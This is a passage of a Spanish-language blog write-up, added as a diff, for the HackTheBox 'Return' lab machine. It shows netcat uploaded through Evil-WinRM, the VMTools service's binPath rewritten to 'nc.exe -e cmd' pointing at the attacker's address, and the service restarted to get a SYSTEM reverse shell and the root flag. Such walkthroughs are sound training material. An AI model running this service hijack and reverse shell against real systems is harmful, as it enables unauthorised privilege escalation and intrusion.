+    <p>Tenemos la capacidad de parar y arrancar un servicio como nos dicen el la web.</p>
+  </li>
+  <li>
+    <p>Lo que vamos a hacer primero es subir el <code class="language-plaintext highlighter-rouge">netcat</code>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe <span class="nb">.</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; upload nc.exe
+                                        
+Info: Uploading /home/miguel7/Hackthebox/Return/nmap/nc.exe to C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments<span class="se">\n</span>c.exe
+                                        
+Data: 37544 bytes of 37544 bytes copied
+                                        
+Info: Upload successful!
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<p>-Vamos a crear un servicio que haga que nos envié una reverse shell a nuestro equipo.</p>
+
+<ul>
+  <li>Pero nos dice que no se puede.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; sc.exe create reverse <span class="nv">binPath</span><span class="o">=</span><span class="s2">"C:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\s</span><span class="s2">vc-printer</span><span class="se">\D</span><span class="s2">ocuments</span><span class="se">\n</span><span class="s2">c.exe -e cmd 10.10.14.14 443"</span>
+<span class="o">[</span>SC] OpenSCManager FAILED 5:
+
+Access is denied.
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<h2 id="shell-as-nt-authority-system">Shell as nt authority system</h2>
+
+<ul>
+  <li>Como tenemos la capacidad de parar y arrancar servicios vamos a manipular el de una que ya exista.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; services
+
+Path                                                                                                                 Privileges Service          
+<span class="nt">----</span>                                                                                                                 <span class="nt">----------</span> <span class="nt">-------</span>          
+C:<span class="se">\W</span>indows<span class="se">\A</span>DWS<span class="se">\M</span>icrosoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             
+<span class="se">\?</span>?<span class="se">\C</span>:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span class="se">\W</span>indows Defender<span class="se">\D</span>efinition Updates<span class="se">\{</span>5533AFC7-64B3-4F6E-B453-E35320B35716<span class="o">}</span><span class="se">\M</span>pKslDrv.sys       True MpKslceeb2796    
+C:<span class="se">\W</span>indows<span class="se">\M</span>icrosoft.NET<span class="se">\F</span>ramework64<span class="se">\v</span>4.0.30319<span class="se">\S</span>MSvcHost.exe                                                              True NetTcpPortSharing
+C:<span class="se">\W</span>indows<span class="se">\S</span>ysWow64<span class="se">\p</span>erfhost.exe                                                                                           True PerfHost         
+<span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogram Files</span><span class="se">\W</span><span class="s2">indows Defender Advanced Threat Protection</span><span class="se">\M</span><span class="s2">sSense.exe"</span>                                                False Sense            
+C:<span class="se">\W</span>indows<span class="se">\s</span>ervicing<span class="se">\T</span>rustedInstaller.exe                                                                                 False TrustedInstaller 
+<span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogram Files</span><span class="se">\V</span><span class="s2">Mware</span><span class="se">\V</span><span class="s2">Mware Tools</span><span class="se">\V</span><span class="s2">Mware VGAuth</span><span class="se">\V</span><span class="s2">GAuthService.exe"</span>                                                     True VGAuthService    
+<span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogram Files</span><span class="se">\V</span><span class="s2">Mware</span><span class="se">\V</span><span class="s2">Mware Tools</span><span class="se">\v</span><span class="s2">mtoolsd.exe"</span>                                                                        True VMTools          
+<span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\W</span><span class="s2">indows Defender</span><span class="se">\p</span><span class="s2">latform</span><span class="se">\4</span><span class="s2">.18.2104.14-0</span><span class="se">\N</span><span class="s2">isSrv.exe"</span>                                             True WdNisSvc         
+<span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\W</span><span class="s2">indows Defender</span><span class="se">\p</span><span class="s2">latform</span><span class="se">\4</span><span class="s2">.18.2104.14-0</span><span class="se">\M</span><span class="s2">sMpEng.exe"</span>                                            True WinDefend        
+<span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogram Files</span><span class="se">\W</span><span class="s2">indows Media Player</span><span class="se">\w</span><span class="s2">mpnetwk.exe"</span>                                                                      False WMPNetworkSvc    
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a manipular uno.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; sc.exe config VMTools <span class="nv">binPath</span><span class="o">=</span><span class="s2">"C:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\s</span><span class="s2">vc-printer</span><span class="se">\D</span><span class="s2">ocuments</span><span class="se">\n</span><span class="s2">c.exe -e cmd 10.10.14.14 443"</span>
+<span class="o">[</span>SC] ChangeServiceConfig SUCCESS
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Nos ponemos en escucha.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvnp</span> 443
+Listening on 0.0.0.0 443
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Y como la tarea es privilegiada ala hora de arrancar el servicio nos va enviar la <strong>reverse shell</strong>.</p>
+  </li>
+  <li>
+    <p>Primero vamos a parar el servicio.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; sc.exe stop VMTools
+
+SERVICE_NAME: VMTools
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 1  STOPPED
+        WIN32_EXIT_CODE    : 0  <span class="o">(</span>0x0<span class="o">)</span>
+        SERVICE_EXIT_CODE  : 0  <span class="o">(</span>0x0<span class="o">)</span>
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora lo arrancamos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt; sc.exe start VMTools
+</code></pre></div></div>
+
+<ul>
+  <li>Y recibimos la shell.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvnp</span> 443
+Listening on 0.0.0.0 443
+Connection received on 10.129.95.241 55672
+Microsoft Windows <span class="o">[</span>Version 10.0.17763.107]
+<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.
+
+<span class="nb">whoami
+whoami
+</span>nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+<h2 id="root-flag">root flag</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+d85fffc0c733cc167c158e77fe6eeda2
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/hackthebox/machines/easy/2024/03/29/return.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolución de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.instagram.com/_darkhorse77?igsh=MWZqYTAyYnJmYWZrdg%3D%3D&utm_source=qr" target="_blank" title="instagram">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
